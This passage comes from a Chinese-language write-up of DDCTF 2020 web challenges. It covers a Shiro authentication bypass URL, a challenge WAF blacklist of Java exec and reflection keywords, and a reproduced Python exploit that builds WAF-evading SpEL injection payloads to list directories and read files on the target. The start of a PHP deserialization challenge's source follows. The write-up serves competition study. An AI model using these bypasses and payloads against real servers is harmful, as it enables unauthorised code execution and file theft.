class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>safeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>safeFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>shiroFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>targetFilterLifecycle<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>shiroFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>500<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/hacker.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">error-page</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">error-code</span>&gt;</span>403<span class="hljs-tag">&lt;/<span class="hljs-name">error-code</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>/hacker.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">error-page</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+<p>经典的Spring框架，知道这个对其实我们其实可以直接把大部分代码读出来了。<br>Spring是一个MVC框架，故读出来的文件中我们需要重点关注的是Controller控制层的代码<br>根据目前的情况，我们需要寻找能够帮助我们成为admin的信息</p>
+<p>一番翻找后，在 &#x2F;WEB-INF&#x2F;classes&#x2F;spring-shiro.xml 中有：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;shiroFilter&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;securityManager&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;securityManager&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/login&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;successUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/index&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;unauthorizedUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/unauthorized&quot;</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;filterChainDefinitionMap&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;filterChainDefinitionMapBuilder&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;buildFilterChainDefinitionMap&quot;</span>/&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;filterChainDefinitionMapBuilder&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.ctf.auth.FilterChainDefinitionMapBuilder&quot;</span>/&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;securityManager&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;realm&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;myRealm&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myRealm&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.ctf.auth.ShiroRealm&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+<p>其下的 &#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;auth&#x2F;FilterChainDefinitionMapBuilder.class 中可以看到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.auth;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterChainDefinitionMapBuilder</span><br>&#123;<br>    <span class="hljs-keyword">public</span> LinkedHashMap&lt;String, String&gt; <span class="hljs-title function_">buildFilterChainDefinitionMap</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">final</span> LinkedHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;String, String&gt;();<br>        map.put(<span class="hljs-string">&quot;/logout&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/index&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/download&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;/68759c96217a32d5b368ad2965f625ef/**&quot;</span>, <span class="hljs-string">&quot;authc,roles[admin]&quot;</span>);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>于是使用CVE绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index<br></code></pre></td></tr></table></figure>
+
+
+
+<p>进入admin界面<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200909143033583.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>后面就是绕WAF做SpE注入L，WAF在 WEB-INF&#x2F;classes&#x2F;com&#x2F;ctf&#x2F;util&#x2F;SafeFilter.class 中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.util;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklists = &#123;<span class="hljs-string">&quot;java.+lang&quot;</span>, <span class="hljs-string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="hljs-string">&quot;exec.*\\(&quot;</span>, <span class="hljs-string">&quot;write|read&quot;</span>, <span class="hljs-string">&quot;invoke.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.forName.*\\(&quot;</span>, <span class="hljs-string">&quot;lookup.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="hljs-string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;com.+fasterxml&quot;</span>, <span class="hljs-string">&quot;org.+apache&quot;</span>, <span class="hljs-string">&quot;org.+hibernate&quot;</span>, <span class="hljs-string">&quot;org.+thymeleaf&quot;</span>, <span class="hljs-string">&quot;javassist&quot;</span>, <span class="hljs-string">&quot;javax\\.&quot;</span>, <span class="hljs-string">&quot;eval.*\\(&quot;</span>, <span class="hljs-string">&quot;\\.getClass\\(&quot;</span>, <span class="hljs-string">&quot;org.+springframework&quot;</span>, <span class="hljs-string">&quot;javax.+el&quot;</span>, <span class="hljs-string">&quot;java.+io&quot;</span>&#125;;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UTF-8&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig arg0)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span><br>            <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">pNames</span> <span class="hljs-operator">=</span> request.getParameterNames();<br>        <span class="hljs-keyword">while</span> (pNames.hasMoreElements()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) pNames.nextElement();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> request.getParameter(name);<br>            <span class="hljs-keyword">for</span> (String blacklist : blacklists) &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> Pattern.compile(blacklist, <span class="hljs-number">34</span>).matcher(value);<br>                <span class="hljs-keyword">if</span> (matcher.find()) &#123;<br>                    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>                    servletResponse.sendError(<span class="hljs-number">403</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        filterChain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>后面没绕出来，贴一下原WP的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">requestToServer</span>(<span class="hljs-params">content</span>):<br>    content = <span class="hljs-string">&#x27;[[$&#123;&#123;&#123;&#125;&#125;&#125;]]&#x27;</span>.<span class="hljs-built_in">format</span>(content)<br>    url = <span class="hljs-string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize&#x27;</span><br>    response = requests.post(url=url, data=&#123;<span class="hljs-string">&#x27;content&#x27;</span>: content&#125;).text<br>    <span class="hljs-keyword">try</span>:<br>        redirect = re.search(<span class="hljs-string">&#x27;fetch \./(.*) !&#x27;</span>, response).group(<span class="hljs-number">1</span>)<br>        url = <span class="hljs-string">&#x27;http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/&#x27;</span><br>        url += redirect<br>        <span class="hljs-keyword">return</span> requests.get(url).text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e) + response<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">toForNameOrStr</span>(<span class="hljs-params">source, strFlag=<span class="hljs-literal">False</span></span>):<br>    res = <span class="hljs-string">&#x27;T(Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(source[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> source[<span class="hljs-number">1</span>:]:<br>        res += <span class="hljs-string">&#x27;.concat(T(Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(ch)<br>    <span class="hljs-keyword">if</span> strFlag:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0.class. forName(&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(res)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handler</span>():<br>    content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>    <span class="hljs-built_in">dir</span> = request.form.get(<span class="hljs-string">&#x27;dir&#x27;</span>)<br>    file = request.form.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">dir</span>:<br>        <span class="hljs-comment"># 单层：java.util.Arrays.toString(java.nio.file.Files.list(java.nio.file.Paths.get(&quot;/&quot;)).toArray());</span><br>        <span class="hljs-comment"># 递归：java.util.Arrays.toString(java.nio.file.Files.walk(java.nio.file.Paths.get(&quot;/&quot;)).toArray());</span><br>        listDirPayload = <span class="hljs-string">&#x27;T(java.util.Arrays).toString(&#123;&#125;.list(&#123;&#125;.get(&#123;&#125;)).toArray())&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Files&#x27;</span>), toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Paths&#x27;</span>), toForNameOrStr(<span class="hljs-built_in">dir</span>, <span class="hljs-literal">True</span>))<br>        <span class="hljs-built_in">print</span>(listDirPayload)<br>        <span class="hljs-keyword">return</span> requestToServer(listDirPayload)<br><br>    <span class="hljs-keyword">if</span> file:<br>        <span class="hljs-comment"># java.nio.file.Files.lines(java.nio.file.Paths.get(&quot;/flag&quot;)).findFirst().toString()</span><br>        catFilePaylod = <span class="hljs-string">&#x27;&#123;&#125;.lines(&#123;&#125;.get(&#123;&#125;)).findFirst().toString()&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Files&#x27;</span>), toForNameOrStr(<span class="hljs-string">&#x27;java.nio.file.Paths&#x27;</span>), toForNameOrStr(file, <span class="hljs-literal">True</span>))<br>        <span class="hljs-built_in">print</span>(catFilePaylod)<br>        <span class="hljs-keyword">return</span> requestToServer(catFilePaylod)<br><br>    <span class="hljs-keyword">return</span> requestToServer(content)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
+
+
+<p>看了看还有另外的思路是使用UrlClassLoader的</p>
+<p>见 <a target="_blank" rel="noopener" href="https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20/">https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20&#x2F;</a></p>
+<h1 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907201435244.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>直接给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;kw0ng = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;find /FlagNeverFall &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$this</span>-&gt;flag));<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Prompter</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;hint))<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;hint);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span 